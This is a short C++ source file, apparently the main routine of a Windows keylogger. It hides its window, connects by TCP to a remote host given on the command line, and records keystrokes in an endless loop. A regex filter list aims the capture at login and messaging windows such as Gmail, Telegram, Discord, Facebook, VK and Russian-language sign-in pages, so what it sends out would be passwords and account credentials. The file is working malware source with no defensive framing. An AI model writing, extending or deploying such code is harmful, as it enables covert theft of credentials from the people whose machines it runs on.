#include "Keylogger.h"

#pragma comment(linker, "/SUBSYSTEM:windows /ENTRY:wmainCRTStartup")

std::vector<std::wstring> filters = { L"(?i)Discord", L"(?i)VK", L"(?i)Google", L"(?i)Yandex", L"(?i)Youtube", L"(?i)Gmail",
									  L"(?i)Telegram", L"(?i)Facebook", L"(?i)Viber", L"(?i)Authorization", L"(?i)Авторизация", L"(?i)Вход", L"(?i)Login" };


int wmain(int argc, wchar_t* argv[]) {
	std::locale::global(std::locale("ru_RU.UTF-8"));

	auto client = new TcpClient(4096);

	while(!client->Connect(argv[1], argv[2])) {
		Sleep(1000);
	}

	Keylogger keylogger(client, new Filter(filters));

	while (true)
	{
		keylogger.logKeys();
		Sleep(50);
	}
	return 0;
}